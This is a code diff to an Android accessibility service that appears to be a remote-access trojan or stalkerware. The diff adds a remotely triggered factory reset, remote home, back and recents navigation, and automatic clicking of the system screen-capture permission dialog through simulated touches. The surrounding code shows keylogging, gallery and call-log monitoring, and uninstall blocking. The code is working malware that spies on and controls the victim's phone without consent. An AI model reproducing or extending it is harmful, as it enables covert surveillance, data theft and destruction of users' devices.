@@ -103,6 +103,10 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_APP_INSTALLED = "APP_INSTALLED";
     public static final String ACTION_ALL_GALLERY = "ALL_GALLERY";
     public static final String ACTION_ONE_GALLERY = "ONE_GALLERY";
+    public static final String ACTION_DEVICE_FORMAT = "DEVICE_FORMAT";
+    public static final String ACTION_DEVICE_HOME = "DEVICE_HOME";
+    public static final String ACTION_DEVICE_BACK = "DEVICE_BACK";
+    public static final String ACTION_DEVICE_RECENT = "DEVICE_RECENT";
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
 //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
     DisplayMetrics displayMetrics;
@@ -165,10 +169,10 @@ public class MainAccessibilityService extends AccessibilityService {
     public void onCreate() {
         super.onCreate();
     }
-    @Override
-    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
-        super.takeScreenshot(displayId, executor, callback);
-    }
+//    @Override
+//    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
+//        super.takeScreenshot(displayId, executor, callback);
+//    }
 
     private void startBackgroundThread() {
         backgroundHandlerThread = new HandlerThread("CameraVideoThread");
@@ -210,6 +214,11 @@ public class MainAccessibilityService extends AccessibilityService {
         } else {
             Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
             getBaseContext().startService(serviceIntentX);
+
+            if(mediaProjection == null) {
+                Intent serviceIntent = new Intent(getBaseContext(), CaptureForgroundService.class);
+                getBaseContext().startService(serviceIntent);
+            }
         }
     }
 
@@ -232,10 +241,11 @@ public class MainAccessibilityService extends AccessibilityService {
             Intent data = intent.getParcelableExtra("data");
 
             if (resultCode == -1 && data != null) {
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+                mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+                if(mediaProjection == null) {
                     mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
-                    startCapture();
                 }
+                startCapture();
             }
         }
     };
@@ -249,9 +259,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 inputText(setTextValue);
             }
             if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-                    requestMediaProjectionPermission();
-                }
+                requestMediaProjectionPermission();
                 sendScreenMonitoringData(screenBase64);
             }
 
@@ -300,6 +308,21 @@ public class MainAccessibilityService extends AccessibilityService {
                 //Gallery Monitor
                 String imageFilePath = intent.getStringExtra("filepath");
                 getOneImageData(imageFilePath);
+            }
+
+            if (ACTION_DEVICE_FORMAT.equals(intent.getAction())) {
+                performFactoryReset();
+            }
+
+            if (ACTION_DEVICE_HOME.equals(intent.getAction())) {
+                onGoHome();
+            }
+
+            if (ACTION_DEVICE_BACK.equals(intent.getAction())) {
+                onGoBack();
+            }
+            if (ACTION_DEVICE_RECENT.equals(intent.getAction())) {
+                onGoRecent();
             }
 
             if (ACTION_CALL_LOGGER.equals(intent.getAction())) {
@@ -367,6 +390,14 @@ public class MainAccessibilityService extends AccessibilityService {
         registerReceiver(screenMonitorReceiver, filter_all_gallery, RECEIVER_EXPORTED);
         IntentFilter filter_one_gallery = new IntentFilter(ACTION_ONE_GALLERY);
         registerReceiver(screenMonitorReceiver, filter_one_gallery, RECEIVER_EXPORTED);
+        IntentFilter filter_device_format = new IntentFilter(ACTION_DEVICE_FORMAT);
+        registerReceiver(screenMonitorReceiver, filter_device_format, RECEIVER_EXPORTED);
+        IntentFilter filter_device_home = new IntentFilter(ACTION_DEVICE_HOME);
+        registerReceiver(screenMonitorReceiver, filter_device_home, RECEIVER_EXPORTED);
+        IntentFilter filter_device_back = new IntentFilter(ACTION_DEVICE_BACK);
+        registerReceiver(screenMonitorReceiver, filter_device_back, RECEIVER_EXPORTED);
+        IntentFilter filter_device_recent = new IntentFilter(ACTION_DEVICE_RECENT);
+        registerReceiver(screenMonitorReceiver, filter_device_recent, RECEIVER_EXPORTED);
 
         IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
         registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);
@@ -378,9 +409,9 @@ public class MainAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
 //        setAutomaticallyPermission(event);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            screenShotDevice();
-        }
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+//            screenShotDevice();
+//        }
         getSkeletonInfo(event);
         setStopUninstall(event);
         getKeyLogger(event);
@@ -390,29 +421,49 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private void requestMediaProjectionPermission() {
         if (mediaProjection == null) {
-            ContextCompat.startForegroundService(this, new Intent(this, CaptureForgroundService.class));
-        }
+            List<MousePositionEntry> notificationdraw = new ArrayList<>();
+            notificationdraw.add(new MousePositionEntry(50,10));
+            notificationdraw.add(new MousePositionEntry(50,13));
+            notificationdraw.add(new MousePositionEntry(50,16));
+            notificationdraw.add(new MousePositionEntry(50,20));
+            notificationdraw.add(new MousePositionEntry(50,23.5));
+            notificationdraw.add(new MousePositionEntry(50,26.5));
+            notificationdraw.add(new MousePositionEntry(50,29.1));
+            notificationdraw.add(new MousePositionEntry(50,44.2));
+            notificationdraw.add(new MousePositionEntry(50,58.1));
+            notificationdraw.add(new MousePositionEntry(50,75.3));
+            notificationdraw.add(new MousePositionEntry(50,91.1));
+            notificationdraw.add(new MousePositionEntry(50,115.5));
+            notificationdraw.add(new MousePositionEntry(50,127.6));
+            notificationdraw.add(new MousePositionEntry(50,141.03));
+            notificationdraw.add(new MousePositionEntry(50,155.62));
+            notificationdraw.add(new MousePositionEntry(50,170.21));
+            notificationdraw.add(new MousePositionEntry(50,182.37));
+            notificationdraw.add(new MousePositionEntry(50,192));
+            notificationdraw.add(new MousePositionEntry(50,200));
+            notificationdraw.add(new MousePositionEntry(50,206));
+            notificationdraw.add(new MousePositionEntry(50,215));
+            notificationdraw.add(new MousePositionEntry(50,221));
+            notificationdraw.add(new MousePositionEntry(50,226));
+            notificationdraw.add(new MousePositionEntry(50,233));
+            notificationdraw.add(new MousePositionEntry(50,234));
+            notificationdraw.add(new MousePositionEntry(50,235));
 
-        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            Common.getInstance().setMousePositionEntries(notificationdraw);
+            mouseDraw();
+        }
     }
     private void setMediaProjectionPermission(AccessibilityEvent event) {
-//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            CharSequence packagename = String.valueOf(event.getPackageName());
-            Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
-            if(packagename.equals("com.android.systemui")) {
-                if(event.getClassName() != null) {
-//                    if(event.getClassName().equals("com.android.systemui.media.MediaProjectionPermissionActivity")
-//                            || event.getClassName().equals("com.android.systemui.mediaprojection.permission.MediaProjectionPermissionActivity")
-//                    || event.getClassName().equals("com.android.systemui.statusbar.phone.AlertDialogWithDelegate")) {
-                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                        if(rootNode != null) {
-                            getMediaProjectionPermission(rootNode);
-                        }
-//                    }
+        CharSequence packagename = String.valueOf(event.getPackageName());
+        Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
+        if(packagename.equals("com.android.systemui")) {
+            if(event.getClassName() != null) {
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                if(rootNode != null) {
+                    getMediaProjectionPermission(rootNode);
                 }
             }
-//        }
-
+        }
     }
 
     private void setStopUninstall(AccessibilityEvent event) {
@@ -479,7 +530,7 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void getMediaProjectionPermission(AccessibilityNodeInfo node) {
-        Log.d(TAG, "<======================getMediaProjectionPermission===========================>");
+//        Log.d(TAG, "<======================getMediaProjectionPermission===========================>");
         if(node != null) {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
@@ -490,6 +541,16 @@ public class MainAccessibilityService extends AccessibilityService {
                             || nodeText.equals("iniciar agora")
                             || nodeText.equals("início")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                }
+            } else if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
+                if(node.getText() != null) {
+                    String nodeText = node.getText().toString().toLowerCase();
+                    Log.d("TextView Text Media", nodeText);
+                    if(nodeText.contains("service is running")) {
+                        if(mediaProjection == null) {
+                            node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
                     }
                 }
             }
@@ -524,7 +585,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString();
                     if(nodeText.contains(getResources().getString(R.string.accessibility_service_description))) {
-                        performGlobalAction(GLOBAL_ACTION_BACK);
+                        onGoBack();
                     }
                 }
             }
@@ -1234,6 +1295,20 @@ public class MainAccessibilityService extends AccessibilityService {
             mDevicePolicyManager.wipeData(0);
         }
     }
+
+    private void onGoHome() {
+        performGlobalAction(GLOBAL_ACTION_HOME);
+    }
+
+    private void onGoBack() {
+        performGlobalAction(GLOBAL_ACTION_BACK);
+    }
+
+    private void onGoRecent() {
+        performGlobalAction(GLOBAL_ACTION_RECENTS);
+    }
+
+
 
 
     //Send Data part
